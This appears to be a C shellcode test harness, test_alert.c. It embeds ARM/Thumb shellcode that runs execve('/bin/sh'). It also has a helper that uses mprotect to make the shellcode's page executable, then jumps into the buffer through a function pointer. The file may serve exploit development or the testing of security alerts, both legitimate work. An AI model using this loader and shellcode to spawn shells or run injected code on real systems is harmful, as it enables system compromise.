/*
	gcc -fno-omit-frame-pointer -Bdynamic -lc -ldl -lrt -lm -lpthread -lgcc_s -fstack-protector-all -Wformat -Wformat-security -Wconversion -Wsign-conversion -Wl,-z,relro,-z,now -o test_alert test_alert.c
*/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <link.h>
#include <elf.h>
#include <errno.h>
#include <time.h>
#include <sys/mman.h>

unsigned char* shellcode = "\x01\x30\x8f\xe2"
		"\x13\xff\x2f\xe1"
		"\x78\x46\x0c\x30"
		"\xc0\x46\x01\x90"
		"\x49\x1a\x92\x1a"
		"\x0b\x27\x01\xdf"
		"\x2f\x62\x69\x6e"
		"\x2f\x73\x68";

int page_protect(void* addr, size_t min_size, int flags)
{
    // Constant holding the page size value
    size_t page_size = sysconf(_SC_PAGE_SIZE);

    if(page_size < min_size)
    {
    	page_size = min_size;
    }

    // Calculate relative page offset
    size_t temp = (size_t)addr;
    temp -= temp % page_size;

    // Update address
    addr = (void*)temp;

    // Update memory area protection
    return mprotect(addr, page_size, flags);
}

int main(int argc, char* argv[])
{

	page_protect(shellcode, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC);

	void (*f)();
	f = (void (*)())shellcode;
	(void)(*f)();

	return 0;
}